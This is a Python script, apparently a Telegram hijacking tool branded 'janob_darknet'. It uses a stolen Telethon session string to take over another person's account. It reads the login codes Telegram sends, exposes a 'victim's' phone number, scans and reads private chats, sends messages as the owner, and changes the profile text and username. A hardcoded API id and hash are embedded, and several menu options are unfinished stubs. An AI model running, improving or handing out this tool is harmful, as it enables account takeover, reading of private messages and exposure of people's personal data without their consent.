#import pyfiglet 
from telethon import TelegramClient, events , sync
from telethon.sessions import StringSession
from time import sleep
import os, sys
from telethon.tl.types import InputPhoneContact
from telethon.tl.functions.contacts import ImportContactsRequest
from telethon import TelegramClient, events, sync, functions, types
from telethon.tl.functions.channels import JoinChannelRequest
from janob_darknet import loginhack
from telethon.tl.functions.messages import SendReactionRequest
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.account import UpdateUsernameRequest
#

print("Developer: https://t.me/janob_darknet")
#

while True:
	os.system("clear")
	menu = input("""\033[1;33m
╭━━━╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╭╮╭━━━╮
┃╭━╮┃╱╭╯╰╮╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╭╯╰┫╭━╮┃
┃┃╱┃┣━╋╮╭╋┳╮╭┳━━┳━━┳━┫╰━┳━┻╮╭┻╯╭╯┃
┃╰━╯┃╭╮┫┃┣┫┃┃┃━━┫┃━┫╭┫╭╮┃╭╮┃┃╭━╯╭╯
┃╭━╮┃┃┃┃╰┫┃╰╯┣━━┃┃━┫┃┃╰╯┃╰╯┃╰┫┃╰━╮
╰╯╱╰┻╯╰┻━┻┻━━┻━━┻━━┻╯╰━━┻━━┻━┻━━━╯
                        \033[1;31m janob_darknet
                         
\033[1;31m• \033[1;32mMenu
	
\033[1;31m1:\033[1;32m Login hack
\033[1;31m2: \033[1;32mPhone number find
\033[1;31m3: \033[1;32mTerminal Managemant
\033[1;31m4: \033[1;32mTool haqida malumot 

\033[1;31m>>>\033[1;39m """)
	if menu == "1":
		api_id = 10953300
		api_hash = "9c24426e5d6fa1d441913e3906627f87"
		string=loginhack.session
	#	string = input("session: ")
		with TelegramClient(StringSession(string), api_id, api_hash) as client:
			client.send_message("me", client.session.save())
		
		async def main():
	
		
		    async for message in client.iter_messages(777000):
		        print("\033[1;32m", message.sender.username, message.text, "\033[1;39m")
		        sleep(10)
		        break

		with client:
			client.loop.run_until_complete(main())
			
#	number
	elif menu == "2":
		api_id = 10953300
		api_hash = "9c24426e5d6fa1d441913e3906627f87"
		
		
		string=loginhack.session
		with TelegramClient(StringSession(string), api_id, api_hash) as client:
			client.send_message("me", client.session.save())
			result = client(functions.contacts.AddContactRequest(
		        id= input("\033[1;32musername: "),
		        first_name="AntiUserbot2",
		        last_name="AntiUserbot2",
		        phone="",
		        add_phone_privacy_exception=True
		    ))
		    
		
		client.start()
		print("\033[1;32mThe program has started and you can see the victim's number by logging into your account\n\nTelegram: @janob_darknet")
		print(client.session.list_sessions())
		client.run_until_disconnected()
		
		
		
		
		#############7
	elif menu == "3":
		while True:
			os.system("clear")
			term = input("""\033[1;33m
╭━━━╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╭╮╭━━━╮
┃╭━╮┃╱╭╯╰╮╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╭╯╰┫╭━╮┃
┃┃╱┃┣━╋╮╭╋┳╮╭┳━━┳━━┳━┫╰━┳━┻╮╭┻╯╭╯┃
┃╰━╯┃╭╮┫┃┣┫┃┃┃━━┫┃━┫╭┫╭╮┃╭╮┃┃╭━╯╭╯
┃╭━╮┃┃┃┃╰┫┃╰╯┣━━┃┃━┫┃┃╰╯┃╰╯┃╰┫┃╰━╮
╰╯╱╰┻╯╰┻━┻┻━━┻━━┻━━┻╯╰━━┻━━┻━┻━━━╯
                  \033[1;31m       janob_darknet
                         
\033[1;31m•\033[1;32m Terminal managemant

\033[1;31m01: \033[1;32mSend message
\033[1;31m02:\033[1;32m All chat scanner
\033[1;31m03: \033[1;32mold messages
\033[1;31m04: \033[1;32mreact posts
\033[1;31m05: \033[1;32msend message all chats
\033[1;31m06:\033[1;32m about change
\033[1;31m07: \033[1;32musername change
\033[1;31m08: \033[1;32mlastname change
\033[1;31m09:\033[1;32m profile image changw
\033[1;31m10:\033[1;32m join public group or channsl
\033[1;31m11: \033[1;32mjoin  private channel or group
\033[1;31m12: \033[1;32mleave group or channel
\033[1;31m13:\033[1;32m info 2 verify password
\033[1;31m14:\033[1;32m remove all seans


\033[1;31m>>>\033[1;39m """)
			if term == "1":
						api_id = 10953300
						api_hash = "9c24426e5d6fa1d441913e3906627f87"
						#os.system("clear")
						
						
						string = loginhack.session
						with TelegramClient(StringSession(string), api_id, api_hash) as client:
						    client.send_message("me", client.session.save())
						
						
						
						async def main():
						    guruh = loginhack.chat
						    
						    await client(JoinChannelRequest(guruh))
						    while True:
						    	await client.send_message(loginhack.chat,  input('message: '))
						
						with client:
						    client.loop.run_until_complete(main())
						    #
			elif term == "2":
				api_id = 10953300
				api_hash = "9c24426e5d6fa1d441913e3906627f87"
				######### @janob_darknet
				
				
				string = loginhack.session
				with TelegramClient(StringSession(string), api_id, api_hash) as client:
				
				    client.send_message("me", client.session.save())
				###########
				
				
				
				@client.on(events.NewMessage(pattern=".scan"))
				async def chatscan(event):
						async for dailog in client.iter_dialogs():
							print(dailog.name + " \033[1;32m id:\033[1;31m " + str(dailog.id))
							
				
						
				client.start()
				print("session egasi bor guruhga .scan buyrugini yuboring ! ")
				client.run_until_disconnected()
			#
			elif term == "3":
				api_id = 10953300
				api_hash = "9c24426e5d6fa1d441913e3906627f87"
				string=loginhack.session
		
				with TelegramClient(StringSession(string), api_id, api_hash) as client:
					client.send_message("me", client.session.save())
				
				async def main():
			
				
				    async for message in client.iter_messages(input("chat: ")):
				        print("\033[1;32m", message.sender.username, message.text, "\033[1;39m")
				        
				        
		
				with client:
					client.loop.run_until_complete(main())
########
			elif term == "4":
				print('\033[1;31mHali Mavjud emas !')
				sleep(5)
			
			#
			elif term == "5":
				print("Hali mavjud emas !")
				sleep(5)
				#
			elif term == "6":
				api_id = 10953300
				api_hash = "9c24426e5d6fa1d441913e3906627f87"
				
				string = loginhack.session
				
				with TelegramClient(StringSession(string), api_id, api_hash) as client:
				    client.send_message("me", client.session.save())
				
				@client.on(events.NewMessage)
				async def _(event):
					
					if '.about' in event.raw_text:
					   await client(UpdateProfileRequest(
				   	 about= loginhack.about
					))
				client.start()
				print("run")
				client.run_until_disconnected()
				sleep(5)
				
			elif term == "7":
				api_id = 10953300
				api_hash = "9c24426e5d6fa1d441913e3906627f87"
				
				string = loginhack.session
				
				with TelegramClient(StringSession(string), api_id, api_hash) as client:
				    client.send_message("me", client.session.save())
				
				@client.on(events.NewMessage)
				async def _(event):
					if '.username' in event.raw_text:
					   await client(UpdateUsernameRequest(loginhack.username))
				
				client.start()
				print("run")
				client.run_until_disconnected()
				sleep(5)
				#
			elif term == "8":
				print("Hali mavjud emas ! ")
				sleep(5)
			elif term == "9":
				print("Hali mavjud emas ! ")
				sleep(5)
			elif term == "10":
				print("Hali mavjud emas ! ")
				sleep(5)
			elif term == "11":
				print("Hali mavjud emas ! ")
				sleep(5)
			elif term == "12":
				print("Hali mavjud emas ! ")
				sleep(5)
			elif term == "13":
				print("Hali mavjud emas ! ")
				sleep(5)
			elif term == "14":
				print("Hali mavjud emas ! ")
				sleep(5)
			else:
				print("Hatolik ! ")
				sleep(5)
	elif menu == "4":
		print("""
Dasturchi: @janob_darknet
Dasturiy g'oya muallifi: @janob_darknet
github: https://github.com/xiroshigo/
telegram: https://t.me/dnl_security
youtube: https://youtube.com/@darknet_off1cial

ushbu dastur yordamida siz string session cofe bor odamning telegram accountiga ulanishingiz mumkum boladi avvalo u odam akauntiga userbot ulagan bolishi lozim full tutorial youtube kanalda !
""")
	sleep(5)

		
	
		